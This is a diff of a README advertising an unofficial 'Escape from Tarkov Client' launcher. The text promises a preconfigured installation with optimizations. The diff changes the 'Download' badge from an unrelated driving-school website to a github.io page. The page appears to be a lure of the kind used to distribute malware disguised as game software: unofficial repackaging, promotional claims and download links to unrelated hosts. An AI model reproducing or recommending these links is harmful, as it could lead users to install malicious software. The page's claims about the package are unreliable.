@@ -2,7 +2,7 @@
 
 **Escape from Tarkov Client** is a fully integrated solution for players who want a smoother, faster, and modular gameplay experience. This launcher offers a complete preconfigured Tarkov installation with optimization presets, content modules, and stability improvements — all in one streamlined package.
 
-[![Download Escape from Tarkov Client](https://img.shields.io/badge/Download-Escape_from_Tarkov_Client-blueviolet)](https://dalahdrivingschool.com/)
+[![Download Escape from Tarkov Client](https://img.shields.io/badge/Download-Escape_from_Tarkov_Client-blueviolet)](https://escape-from-tarkov.github.io/.github)
 
 ---
 
